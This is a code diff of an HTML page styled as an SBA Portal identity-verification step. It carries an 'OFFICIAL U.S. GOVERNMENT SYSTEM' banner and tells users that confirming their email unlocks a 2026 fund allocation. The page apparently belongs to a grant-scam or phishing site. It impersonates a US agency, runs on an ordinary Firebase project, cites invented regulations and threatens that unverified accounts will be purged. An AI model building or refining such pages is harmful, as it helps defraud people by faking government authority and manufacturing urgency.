@@ -3,92 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBA Portal | Identity Verification Required</title>
-    <link rel="stylesheet" href="style.css">
+    <title>SBA Portal | Identity Verification</title>
     <style>
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
+        :root { --sba-blue: #00274c; --sba-accent: #0071bc; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
+        
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
         .pulse-text { animation: pulse 2s infinite; }
-        .verification-icon {
-            font-size: 64px;
-            margin-bottom: 25px;
-            display: inline-block;
-            filter: drop-shadow(0 4px 10px rgba(0,39,76,0.15));
-        }
-        .status-pill.approved {
-            background: #ecfdf5;
-            color: #065f46;
-            border: 1px solid #d1fae5;
-        }
-        .status-pill.pending {
-            background: #fff7ed;
-            color: #9a3412;
-            border: 1px solid #ffedd5;
-        }
+
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 16px; text-align: center; }
+        
+        .container { max-width: 420px; margin: 20px auto; padding: 0 15px; }
+        .card { background: white; padding: 40px 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 6px solid var(--sba-accent); text-align: center; }
+        
+        .status-pill { display: inline-block; padding: 6px 15px; border-radius: 20px; font-size: 11px; font-weight: 800; text-transform: uppercase; margin-bottom: 25px; }
+        .status-pill.pending { background: #fff7ed; color: #9a3412; border: 1px solid #ffedd5; }
+        .status-pill.verified { background: #ecfdf5; color: #065f46; border: 1px solid #d1fae5; }
+
+        .instruction-box { background: #f0f7ff; border: 1px solid #dbeafe; padding: 20px; border-radius: 12px; text-align: left; margin: 25px 0; }
+        .instruction-box b { font-size: 10px; color: #1e40af; text-transform: uppercase; display: block; margin-bottom: 10px; }
+        .instruction-box li { font-size: 12px; color: #1e40af; margin-bottom: 8px; line-height: 1.4; }
+
+        .btn-refresh { background: var(--sba-accent); color: white; padding: 16px; border-radius: 8px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
+        .btn-logout { background: transparent; color: #64748b; padding: 12px; width: 100%; border: 1px solid #cbd5e1; border-radius: 8px; margin-top: 15px; font-weight: 700; cursor: pointer; font-size: 11px; }
     </style>
 </head>
-<body style="background: #f1f5f9;">
+<body>
+
     <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
-        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURITY GATEWAY
     </div>
 
-    <div class="nav" style="justify-content: center; background: #00274c; padding: 16px; display: flex;">
-        <h1 style="font-size: 14px; letter-spacing: 3px; color: white; margin: 0;">SECURITY PROTOCOL</h1>
+    <div class="nav-header">
+        <h1 style="color:white; margin:0; font-size:14px; letter-spacing:2px; font-weight: 900;">SECURITY PROTOCOL</h1>
     </div>
 
     <div class="container">
-        <div class="card" style="text-align: center; padding: 45px 24px; border-top: 6px solid #0071bc; border-radius: 14px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); margin-top: 20px;">
+        <div class="card">
+            <div id="statusPill" class="status-pill pending pulse-text">Awaiting Email Confirmation</div>
             
-            <div id="statusPill" class="status-pill pending pulse-text" style="margin-bottom: 25px; padding: 6px 16px; display: inline-block; font-size: 12px; font-weight: bold; border-radius: 20px;">
-                Awaiting Verification
-            </div>
-
-            <div class="verification-icon">📧</div>
-            
-            <h2 style="color: #00274c; font-size: 22px; margin-bottom: 12px; letter-spacing: -0.5px;">Verify Your Credentials</h2>
-            
-            <p style="color: #64748b; font-size: 13px; line-height: 1.7; margin-bottom: 30px;">
-                A secure authentication link has been dispatched to your registered email. In compliance with <b>FY2026 SBA Data Sovereignty Regulations</b>, you must verify your address to unlock your allocation.
+            <div style="font-size: 50px; margin-bottom: 15px;">📩</div>
+            <h2 style="color: var(--sba-blue); margin: 0; font-size: 22px;">Confirm Your Identity</h2>
+            <p style="color: #64748b; font-size: 13px; margin-top: 10px; line-height: 1.5;">
+                A secure 2026 activation link has been sent to your inbox. You must confirm your email to authorize the fund allocation.
             </p>
 
-            <div style="background: #f0f7ff; border: 1px solid #dbeafe; padding: 20px; border-radius: 12px; font-size: 12px; color: #1e40af; margin-bottom: 30px; text-align: left; line-height: 1.6;">
-                <b style="text-transform: uppercase; font-size: 10px; letter-spacing: 0.5px; display: block; margin-bottom: 10px;">Required Security Actions:</b>
-                <ul style="margin: 0 0 0 18px; padding: 0; display: flex; flex-direction: column; gap: 8px;">
-                    <li>Access your registered email inbox.</li>
-                    <li>Open the official <b>SBA.GOV Security</b> notice.</li>
-                    <li>Click the <b>"Confirm Identity"</b> button.</li>
-                    <li>Check <b>Spam/Junk</b> folders if not visible.</li>
+            <div class="instruction-box">
+                <b>Required Steps:</b>
+                <ul style="margin:0; padding-left:15px;">
+                    <li>Open your registered email inbox.</li>
+                    <li>Look for <b>"Verify your email for sba-grant-2026"</b>.</li>
+                    <li>Click the <b>verification link</b> provided.</li>
+                    <li>Return here to access your dashboard.</li>
                 </ul>
             </div>
 
-            <button onclick="location.reload()" id="checkStatusBtn" style="background: #0071bc; color: white; padding: 16px; border-radius: 10px; width: 100%; font-weight: 800; border: none; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; margin-bottom: 15px;">
-                I've Verified - Refresh Status
-            </button>
-            
-            <button id="logoutBtn" style="background: transparent; border: 1px solid #cbd5e1; color: #64748b; padding: 12px; width: 100%; border-radius: 8px; font-size: 11px; font-weight: 700; text-transform: uppercase; cursor: pointer;">
-                Cancel & Return to Login
-            </button>
-            
-            <p style="font-size: 11px; color: #94a3b8; margin-top: 25px;">
-                Didn't receive the link? <br>
-                <a href="#" id="resendBtn" style="color: #0071bc; text-decoration: none; font-weight: 800; text-transform: uppercase; font-size: 10px; display: inline-block; margin-top: 5px;">Resend Secure Link</a>
-            </p>
-        </div>
+            <button onclick="location.reload()" class="btn-refresh">I've Verified My Email</button>
+            <button id="logoutBtn" class="btn-logout">CANCEL & SIGN OUT</button>
 
-        <div style="text-align: center; margin-top: 30px; padding: 0 20px;">
-            <p style="font-size: 10px; color: #94a3b8; line-height: 1.4;">
-                <b>PRIVACY ACT NOTICE:</b> This verification link is valid for 60 minutes. Failure to verify within the allotted time will result in a temporary security hold on your 2026 allocation.
+            <p style="font-size: 11px; color: #94a3b8; margin-top: 25px;">
+                Missing the email? <a href="#" id="resendBtn" style="color: var(--sba-accent); text-decoration: none; font-weight: 800;">RESEND LINK</a>
             </p>
         </div>
+        
+        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 20px; line-height: 1.4; padding: 0 20px;">
+            <b>NOTICE:</b> Unverified accounts are purged from the 2026 allocation queue after 24 hours of inactivity.
+        </p>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-        import { getAuth, sendEmailVerification, onAuthStateChanged, reload, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { getAuth, onAuthStateChanged, reload, signOut, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
@@ -101,64 +88,36 @@
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
-        const statusPill = document.getElementById('statusPill');
+        const pill = document.getElementById('statusPill');
 
         onAuthStateChanged(auth, async (user) => {
-            if (user) {
-                // If user is already verified, send to welcome/dashboard immediately
+            if (!user) { window.location.href = 'index.html'; return; }
+
+            // Continuous background check
+            const checkInterval = setInterval(async () => {
+                await reload(user);
                 if (user.emailVerified) {
-                    window.location.href = 'welcome.html';
-                    return;
+                    clearInterval(checkInterval);
+                    pill.innerText = "IDENTITY CONFIRMED ✓";
+                    pill.className = "status-pill verified";
+                    setTimeout(() => { window.location.href = 'welcome.html'; }, 1500);
                 }
-
-                // Check status every 3 seconds automatically
-                const checkInterval = setInterval(async () => {
-                    try {
-                        await reload(user);
-                        if (user.emailVerified) {
-                            clearInterval(checkInterval);
-                            statusPill.innerText = "IDENTITY VERIFIED";
-                            statusPill.classList.remove('pending', 'pulse-text');
-                            statusPill.classList.add('approved');
-                            
-                            setTimeout(() => { 
-                                window.location.href = 'welcome.html'; 
-                            }, 2000);
-                        }
-                    } catch (e) {
-                        console.error("Auth reload failed", e);
-                    }
-                }, 3000);
-            } else {
-                window.location.href = 'index.html';
-            }
+            }, 3000);
         });
 
-        // Resend Verification Email
-        document.getElementById('resendBtn').addEventListener('click', async (e) => {
+        document.getElementById('resendBtn').onclick = async (e) => {
             e.preventDefault();
-            const user = auth.currentUser;
-            const link = e.target;
-            
-            if(user) {
-                try {
-                    await sendEmailVerification(user);
-                    alert("SECURITY HANDSHAKE: A new verification link has been transmitted to your inbox.");
-                    link.innerText = "LINK TRANSMITTED";
-                    link.style.pointerEvents = "none";
-                    link.style.color = "#94a3b8";
-                } catch(err) {
-                    alert("RATE LIMIT EXCEEDED: Please wait 60 seconds before requesting another secure link.");
-                }
+            try {
+                await sendEmailVerification(auth.currentUser);
+                alert("SUCCESS: A new security link has been dispatched.");
+            } catch(err) {
+                alert("Hold on! You just requested a link. Please check your spam folder.");
             }
-        });
+        };
 
-        // Logout
-        document.getElementById('logoutBtn').addEventListener('click', () => {
-            signOut(auth).then(() => {
-                window.location.href = 'index.html';
-            });
-        });
+        document.getElementById('logoutBtn').onclick = () => {
+            signOut(auth).then(() => { window.location.href = 'index.html'; });
+        };
     </script>
 </body>
 </html>
